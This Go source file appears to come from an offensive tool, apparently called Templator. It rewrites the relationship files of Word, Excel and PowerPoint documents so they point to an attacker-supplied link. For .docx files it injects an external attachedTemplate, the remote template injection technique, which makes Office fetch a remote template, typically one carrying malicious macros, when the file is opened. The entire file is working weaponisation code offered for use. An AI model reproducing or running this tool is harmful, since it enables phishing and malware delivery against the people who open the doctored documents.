package Manager

import (
	"Templator/Packages/Colors"
	"Templator/Packages/Converters"
	"Templator/Packages/Output"
	"Templator/Packages/Utils"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"
)

var (
	xmlWordTemplate string = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="%s" TargetMode="External" />
</Relationships>
`
	xmlXLTemplate string = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="%s"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet3.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item3.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item2.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet4.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item1.xml"/></Relationships>`

	xmlPPTTemplate string = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
	<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="%s"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide9.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item3.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide3.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide8.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item2.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/commentAuthors" Target="commentAuthors.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../customXml/item1.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide2.xml"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide7.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/handoutMaster" Target="handoutMasters/handoutMaster1.xml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide6.xml"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide5.xml"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesMaster" Target="notesMasters/notesMaster1.xml"/></Relationships>`
)

// Inject2Template function
func Inject2Template(fileType string, input string, output string, link string) {
	logger := log.New(os.Stderr, "[!] ", 0)
	switch fileType {
	case "docx":
		// Call function named Inject2TemplateDocx
		Inject2TemplateOffice(input, output, link, "docx")
	case "xlsx":
		// Call function named Inject2TemplateXlsx
		Inject2TemplateOffice(input, output, link, "xlsx")
	case "pptx":
		// Call function named Inject2TemplatePptx
		Inject2TemplateOffice(input, output, link, "pptx")
	default:
		logger.Fatal("The file type is not supported.")
	}
}

// Inject2TemplateOffice function
func Inject2TemplateOffice(input string, output string, link string, statement string) {
	logger := log.New(os.Stderr, "[!] ", 0)

	// Declare variables
	var xmlFilePath string
	var template string

	// Call function named CreateBackup
	Converters.CreateBackup(input)

	// Rename the .docx file to .zip
	zipArchive := input + ".zip"

	// Record the start time
	CreationStartTime := time.Now()

	err := os.Rename(input, zipArchive)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Call function named RemoveExtension
	folderName := Converters.RemoveExtension(input)

	// Extract the contents of the .docx file to the folder
	if err := Converters.Unzip(zipArchive, folderName); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Remove the original zip archive
	if err := os.Remove(zipArchive); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Set xmlFile path and template
	switch statement {
	case "docx":
		xmlFilePath = folderName + "\\word\\_rels\\settings.xml.rels"
		template = xmlWordTemplate
	case "xlsx":
		xmlFilePath = folderName + "\\xl\\_rels\\workbook.xml.rels"
		template = xmlXLTemplate
	case "pptx":
		xmlFilePath = folderName + "\\ppt\\_rels\\presentation.xml.rels"
		template = xmlPPTTemplate
	default:
		logger.Fatal("The file type is not supported.")
	}

	// Attempt to remove the file
	err = os.Remove(xmlFilePath)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Create a new file and write the template with the target value
	err = ioutil.WriteFile(xmlFilePath, []byte(fmt.Sprintf(template, link)), 0644)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Call function named CreateZipArchive
	Converters.CreateZipArchive(folderName, zipArchive)

	// Remove the folder
	if err := os.RemoveAll(folderName); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Record the end time
	CreationEndTime := time.Now()

	// Calculate the duration
	CreationDuration := CreationEndTime.Sub(CreationStartTime)

	if input != output {
		// Call function named SetOutput
		Output.SetOutput(zipArchive, output)
	} else {
		// Call function named SetOutput
		Output.SetOutput(zipArchive, input)
	}

	// Call function named GetAbsolutePath
	output = Utils.GetAbsolutePath(output)

	fmt.Printf("[+] MS Office template document successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(output), CreationDuration)
}
